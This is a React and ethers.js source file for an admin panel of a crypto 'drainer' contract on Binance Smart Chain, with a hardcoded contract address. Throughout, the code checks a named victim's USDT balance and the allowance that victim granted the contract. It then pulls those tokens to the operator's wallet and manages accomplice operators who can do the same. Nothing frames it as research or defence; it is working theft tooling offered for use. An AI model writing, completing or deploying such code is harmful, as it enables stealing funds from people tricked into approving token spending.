import React, { useState, useEffect, useCallback } from 'react';
import { ethers } from 'ethers'; // ethers.js is crucial for blockchain interaction

// --- CONFIGURATION ---
const CONTRACT_ADDRESS = "0x8c8C07d9cc5aDCb443c7257ad43b01EB26a2636F"; // Your deployed AutoUSDTDrainer contract address
const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT Token Address on Binance Smart Chain Mainnet
const USDT_DECIMALS = 18; // Standard for USDT on BSC

// ABI for your AutoUSDTDrainer contract
const AUTO_DRAINER_ABI = [
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "operator",
                "type": "address"
            }
        ],
        "name": "addOperator",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "victim",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "destination",
                "type": "address"
            }
        ],
        "name": "autoPullUSDT",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "to",
                "type": "address"
            }
        ],
        "name": "forwardCollected",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "operator",
                "type": "address"
            }
        ],
        "name": "removeOperator",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "contractUSDTBalance",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "name": "operators",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "usdtToken",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
            }
];

// Minimal ERC20 ABI for USDT (balanceOf, allowance)
const ERC20_ABI = [
    "function balanceOf(address account) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

// --- Helper for network names ---
const getNetworkName = (chainId) => {
    switch (chainId) {
        case 1: return "Ethereum Mainnet";
        case 56: return "Binance Smart Chain Mainnet";
        case 97: return "Binance Smart Chain Testnet";
        case 137: return "Polygon Mainnet";
        case 80001: return "Polygon Mumbai Testnet";
        default: return `Unknown Chain ID: ${chainId}`;
    }
};

function App() {
    // --- State Variables ---
    const [provider, setProvider] = useState(null);
    const [signer, setSigner] = useState(null);
    const [autoDrainerContract, setAutoDrainerContract] = useState(null);
    const [usdtContract, setUsdtContract] = useState(null);
    const [connectedAccount, setConnectedAccount] = useState(null);
    const [network, setNetwork] = useState('Unknown');
    const [contractOwnerAddress, setContractOwnerAddress] = useState('Loading...');
    const [isOwner, setIsOwner] = useState(false);
    const [isOperator, setIsOperator] = useState(false);
    const [status, setStatus] = useState({ message: 'Please connect your wallet.', type: 'info' });

    // Drainer specific states
    const [victimAddressInput, setVictimAddressInput] = useState('');
    const [destinationAddressInput, setDestinationAddressInput] = useState('');
    const [victimUSDTBalance, setVictimUSDTBalance] = useState('N/A');
    const [victimAllowance, setVictimAllowance] = useState('N/A');
    const [amountToPull, setAmountToPull] = useState('N/A');

    // Other function inputs
    const [forwardToAddressInput, setForwardToAddressInput] = useState('');
    const [operatorAddressInput, setOperatorAddressInput] = useState('');

    // Contract Info Display
    const [contractUSDTBalance, setContractUSDTBalance] = useState('Loading...');
    const [contractUSDTTokenAddress, setContractUSDTTokenAddress] = useState('Loading...');

    // --- Utility Functions ---
    const setAppStatus = (message, type = 'info') => {
        setStatus({ message, type });
    };

    const isValidAddress = (address) => {
        try {
            ethers.utils.getAddress(address);
            return true;
        } catch (e) {
            return false;
        }
    };

    // --- Core Connection and Data Fetching ---
    const connectWallet = useCallback(async () => {
        if (typeof window.ethereum !== 'undefined') {
            try {
                const ethProvider = new ethers.providers.Web3Provider(window.ethereum);
                setProvider(ethProvider);

                const accounts = await ethProvider.send("eth_requestAccounts", []);
                const currentSigner = ethProvider.getSigner();
                setSigner(currentSigner);
                setConnectedAccount(accounts[0]);

                const networkData = await ethProvider.getNetwork();
                setNetwork(getNetworkName(networkData.chainId));

                const drainerContract = new ethers.Contract(CONTRACT_ADDRESS, AUTO_DRAINER_ABI, currentSigner);
                setAutoDrainerContract(drainerContract);

                const usdtTokenContract = new ethers.Contract(USDT_TOKEN_ADDRESS, ERC20_ABI, ethProvider); // Read-only for general balance/allowance
                setUsdtContract(usdtTokenContract);

                setDestinationAddressInput(accounts[0]); // Auto-fill destination with connected wallet
                setForwardToAddressInput(accounts[0]); // Auto-fill forward to with connected wallet

                setAppStatus('Wallet connected. Fetching contract details...', 'info');

            } catch (error) {
                console.error("Error connecting wallet:", error);
                setAppStatus(`Error connecting wallet: ${error.message || error.code || "Unknown error"}`, 'error');
                setConnectedAccount(null);
                setNetwork('Unknown');
                setSigner(null);
                setProvider(null);
                setAutoDrainerContract(null);
                setUsdtContract(null);
            }
        } else {
            setAppStatus("MetaMask or similar wallet not detected! Please install it.", 'error');
        }
    }, []);

    const getContractInfo = useCallback(async () => {
        if (!autoDrainerContract) {
            setContractOwnerAddress('N/A');
            setContractUSDTBalance('N/A');
            setContractUSDTTokenAddress('N/A');
            return;
        }

        try {
            const ownerAddr = await autoDrainerContract.owner();
            setContractOwnerAddress(ownerAddr);

            const balanceWei = await autoDrainerContract.contractUSDTBalance();
            const balanceFormatted = ethers.utils.formatUnits(balanceWei, USDT_DECIMALS);
            setContractUSDTBalance(`${balanceFormatted} USDT`);

            const usdtTokenAddr = await autoDrainerContract.usdtToken();
            setContractUSDTTokenAddress(usdtTokenAddr);

            // Determine if connected account is owner or operator
            if (connectedAccount) {
                const isCurrentOwner = connectedAccount.toLowerCase() === ownerAddr.toLowerCase();
                setIsOwner(isCurrentOwner);
                if (!isCurrentOwner) {
                    const isCurrentOperator = await autoDrainerContract.operators(connectedAccount);
                    setIsOperator(isCurrentOperator);
                    if (isCurrentOperator) {
                        setAppStatus(`Wallet connected. You are an operator.`, 'info');
                    } else {
                        setAppStatus(`Wallet connected. You are NOT the contract owner or an operator.`, 'info');
                    }
                } else {
                    setIsOperator(false); // Owner is not separately an operator
                    setAppStatus(`Wallet connected! You are the contract owner.`, 'success');
                }
            } else {
                setIsOwner(false);
                setIsOperator(false);
            }

        } catch (error) {
            console.error("Error getting contract info:", error);
            setAppStatus(`Error getting contract info: ${error.message || "Unknown error"}`, 'error');
            setContractOwnerAddress('Error');
            setContractUSDTBalance('Error');
            setContractUSDTTokenAddress('Error');
        }
    }, [autoDrainerContract, connectedAccount]);

    const checkVictimBalanceAndAllowance = useCallback(async () => {
        setVictimUSDTBalance('Fetching...');
        setVictimAllowance('Fetching...');
        setAmountToPull('Calculating...');

        const victim = victimAddressInput.trim();

        if (!isValidAddress(victim)) {
            setAppStatus("Please enter a valid victim address.", 'error');
            setVictimUSDTBalance('Invalid Address');
            setVictimAllowance('Invalid Address');
            setAmountToPull('Invalid Address');
            return;
        }

        if (!usdtContract || !autoDrainerContract) {
            setAppStatus("Wallet not connected or contracts not initialized.", 'error');
            return;
        }

        try {
            setAppStatus("Checking victim's USDT balance and allowance...", 'info');
            
            const victimBalanceRaw = await usdtContract.balanceOf(victim);
            const victimAllowanceRaw = await usdtContract.allowance(victim, CONTRACT_ADDRESS);

            const victimBalanceFormatted = ethers.utils.formatUnits(victimBalanceRaw, USDT_DECIMALS);
            const victimAllowanceFormatted = ethers.utils.formatUnits(victimAllowanceRaw, USDT_DECIMALS);

            setVictimUSDTBalance(`${victimBalanceFormatted} USDT`);
            setVictimAllowance(`${victimAllowanceFormatted} USDT`);

            const amountToPullRaw = victimAllowanceRaw.lt(victimBalanceRaw) ? victimAllowanceRaw : victimBalanceRaw;
            const amountToPullFormatted = ethers.utils.formatUnits(amountToPullRaw, USDT_DECIMALS);
            setAmountToPull(`${amountToPullFormatted} USDT`);

            if (amountToPullRaw.gt(0)) {
                setAppStatus("Victim's USDT balance and allowance checked. Ready to pull.", 'success');
            } else {
                setAppStatus("No USDT balance or allowance found for this victim.", 'info');
            }

        } catch (error) {
            console.error("Error fetching victim's USDT data:", error);
            setAppStatus(`Error fetching victim's USDT data: ${error.message || "Unknown error"}`, 'error');
            setVictimUSDTBalance('Error');
            setVictimAllowance('Error');
            setAmountToPull('Error');
        }
    }, [victimAddressInput, usdtContract, autoDrainerContract]);

    // --- Transaction Execution ---
    const executeTransaction = useCallback(async (methodName, args, successMsg) => {
        if (!signer || !autoDrainerContract) {
            setAppStatus("Wallet not connected or contract not initialized.", 'error');
            return;
        }

        // Basic authorization check
        if (!isOwner && !isOperator && methodName === 'autoPullUSDT') {
            setAppStatus("You are not authorized to pull USDT (neither owner nor operator).", 'error');
            return;
        }
        if (!isOwner && (methodName === 'addOperator' || methodName === 'removeOperator' || methodName === 'forwardCollected')) {
            setAppStatus("You are not the contract owner to perform this action.", 'error');
            return;
        }

        try {
            setAppStatus(`Sending transaction for ${methodName}...`, 'info');
            
            const tx = await autoDrainerContract[methodName](...args);
            setAppStatus(`Transaction sent! Hash: ${tx.hash}. Waiting for confirmation...`, 'info');
            console.log("Transaction:", tx);
            
            await tx.wait(); // Wait for transaction to be mined
            setAppStatus(`${successMsg} Transaction confirmed! Hash: ${tx.hash}`, 'success');

            // Refresh relevant info after successful transactions
            if (methodName === 'addOperator' || methodName === 'removeOperator' || methodName === 'forwardCollected') {
                getContractInfo();
            }
            if (methodName === 'autoPullUSDT') {
                checkVictimBalanceAndAllowance(); // Re-check victim status
            }

        } catch (error) {
            console.error(`Error executing ${methodName}:`, error);
            const errorMessage = error.message.includes("user rejected transaction") ? "Transaction rejected by user." : 
                                 error.data && error.data.message ? error.data.message : 
                                 error.message;
            setAppStatus(`Error executing ${methodName}: ${errorMessage}`, 'error');
        }
    }, [signer, autoDrainerContract, isOwner, isOperator, getContractInfo, checkVictimBalanceAndAllowance]);

    // --- Handlers for Buttons ---
    const handlePullUsdt = () => executeTransaction('autoPullUSDT', [victimAddressInput, destinationAddressInput], 'USDT Pull successful!');
    const handleForwardCollected = () => executeTransaction('forwardCollected', [forwardToAddressInput], 'USDT Forward successful!');
    const handleAddOperator = () => executeTransaction('addOperator', [operatorAddressInput], 'Operator added successfully!');
    const handleRemoveOperator = () => executeTransaction('removeOperator', [operatorAddressInput], 'Operator removed successfully!');

    // --- Effects for Lifecycle and Event Listeners ---
    useEffect(() => {
        if (autoDrainerContract && connectedAccount) {
            getContractInfo(); // Fetch info once contracts are set up
        }
    }, [autoDrainerContract, connectedAccount, getContractInfo]);

    useEffect(() => {
        // Listen for MetaMask account/chain changes
        if (window.ethereum) {
            const handleAccountsChanged = (accounts) => {
                if (accounts.length === 0) {
                    setAppStatus("Wallet disconnected.", 'info');
                    setConnectedAccount(null);
                    setNetwork('Unknown');
                    setSigner(null);
                    setProvider(null);
                    setAutoDrainerContract(null);
                    setUsdtContract(null);
                    // Clear inputs and displays
                    setVictimAddressInput('');
                    setDestinationAddressInput('');
                    setForwardToAddressInput('');
                    setOperatorAddressInput('');
                    setVictimUSDTBalance('N/A');
                    setVictimAllowance('N/A');
                    setAmountToPull('N/A');
                } else {
                    connectWallet(); // Reconnect to update all states
                }
            };

            const handleChainChanged = (chainId) => {
                connectWallet(); // Reconnect to update network info
            };

            window.ethereum.on('accountsChanged', handleAccountsChanged);
            window.ethereum.on('chainChanged', handleChainChanged);

            // Cleanup listeners on component unmount
            return () => {
                window.ethereum.removeListener('accountsChanged', handleAccountsChanged);
                window.ethereum.removeListener('chainChanged', handleChainChanged);
            };
        }
    }, [connectWallet]);

    // --- Render Logic for Button Disabling ---
    const isWalletConnected = !!connectedAccount;
    const canPullUSDT = isWalletConnected && (isOwner || isOperator) && isValidAddress(victimAddressInput) && isValidAddress(destinationAddressInput);
    const canForwardCollected = isWalletConnected && isOwner && isValidAddress(forwardToAddressInput);
    const canManageOperators = isWalletConnected && isOwner && isValidAddress(operatorAddressInput);
    const canCheckVictim = isWalletConnected && isValidAddress(victimAddressInput);

    return (
        <div className="container">
            <h1>Advanced AutoUSDTDrainer Admin Panel</h1>
            <p style={{ textAlign: 'center', color: '#666' }}>Interact with your deployed smart contract.</p>

            <hr />

            <div className="wallet-info">
                <button onClick={connectWallet} disabled={isWalletConnected}>
                    {isWalletConnected ? 'Wallet Connected' : 'Connect Wallet'}
                </button>
                <p style={{ marginTop: '15px' }}><strong>Status:</strong> {connectedAccount || 'Not Connected'}</p>
                <p style={{ marginTop: '5px' }}><strong>Network:</strong> {network}</p>
                {connectedAccount && (
                    <p style={{ marginTop: '5px' }}>
                        <strong>Role:</strong> {isOwner ? 'Owner' : (isOperator ? 'Operator' : 'Regular User')}
                    </p>
                )}
            </div>

            <div id="status" className={`status-message ${status.type}`}>{status.message}</div>

            <hr />

            <div className="function-group">
                <h2 className="section-title">Token Drainer</h2>
                <p style={{ color: '#555', marginBottom: '20px' }}>Input a victim's address to check their USDT balance and the allowance given to your contract, then drain approved tokens.</p>
                <div>
                    <label htmlFor="victimAddressDrain">Victim Address (approved this contract):</label>
                    <input
                        type="text"
                        id="victimAddressDrain"
                        placeholder="e.g., 0xAbc...123"
                        value={victimAddressInput}
                        onChange={(e) => {
                            setVictimAddressInput(e.target.value);
                            // Reset victim info on input change
                            setVictimUSDTBalance('N/A');
                            setVictimAllowance('N/A');
                            setAmountToPull('N/A');
                        }}
                    />
                    <button onClick={checkVictimBalanceAndAllowance} disabled={!canCheckVictim}>
                        Check Victim's USDT
                    </button>
                </div>
                <div className="data-display">
                    <p><strong>Victim USDT Balance:</strong> <span id="victimUSDTBalance">{victimUSDTBalance}</span></p>
                    <p><strong>Allowance to My Contract:</strong> <span id="victimAllowance">{victimAllowance}</span></p>
                    <p><strong>Tokens to Pull (Min of above):</strong> <span id="amountToPullDisplay">{amountToPull}</span></p>
                </div>
                <div style={{ marginTop: '20px' }}>
                    <label htmlFor="destinationAddressDrain">Destination Address (auto-filled with your connected wallet):</label>
                    <input
                        type="text"
                        id="destinationAddressDrain"
                        value={destinationAddressInput}
                        readOnly
                    />
                </div>
                <button onClick={handlePullUsdt} disabled={!canPullUSDT}>
                    Execute autoPullUSDT
                </button>
            </div>

            <div className="function-group">
                <h2 className="section-title">Forward Contract's Collected USDT</h2>
                <p style={{ color: '#555', marginBottom: '20px' }}>If USDT was sent directly to this contract, use this to forward it.</p>
                <div>
                    <label htmlFor="forwardToAddress">Forward To Address (auto-filled with your connected wallet):</label>
                    <input
                        type="text"
                        id="forwardToAddress"
                        value={forwardToAddressInput}
                        readOnly
                    />
                </div>
                <button onClick={handleForwardCollected} disabled={!canForwardCollected}>
                    Execute forwardCollected
                </button>
            </div>

            <div className="function-group">
                <h2 className="section-title">Manage Operators</h2>
                <p style={{ color: '#555', marginBottom: '20px' }}>Add or remove addresses authorized to call `autoPullUSDT` (besides the owner).</p>
                <div>
                    <label htmlFor="operatorAddress">Operator Address:</label>
                    <input
                        type="text"
                        id="operatorAddress"
                        placeholder="e.g., 0xDef...456"
                        value={operatorAddressInput}
                        onChange={(e) => setOperatorAddressInput(e.target.value)}
                    />
                </div>
                <div style={{ display: 'flex', gap: '10px' }}>
                    <button onClick={handleAddOperator} disabled={!canManageOperators}>
                        Add Operator
                    </button>
                    <button onClick={handleRemoveOperator} disabled={!canManageOperators}>
                        Remove Operator
                    </button>
                </div>
            </div>

            <div className="function-group">
                <h2 className="section-title">Read Contract Data</h2>
                <p style={{ color: '#555', marginBottom: '20px' }}>Check contract owner, balance, and token address.</p>
                <div>
                    <button onClick={getContractInfo} disabled={!isWalletConnected}>
                        Refresh Contract Info
                    </button>
                    <p style={{ marginTop: '15px' }}><strong>Contract Owner:</strong> <span id="displayOwner">{contractOwnerAddress}</span></p>
                    <p><strong>Contract USDT Balance:</strong> <span id="displayUSDTBalance">{contractUSDTBalance}</span></p>
                    <p><strong>USDT Token Address:</strong> <span id="displayUSDTTokenAddress">{contractUSDTTokenAddress}</span></p>
                </div>
            </div>
        </div>
    );
}

export default App;
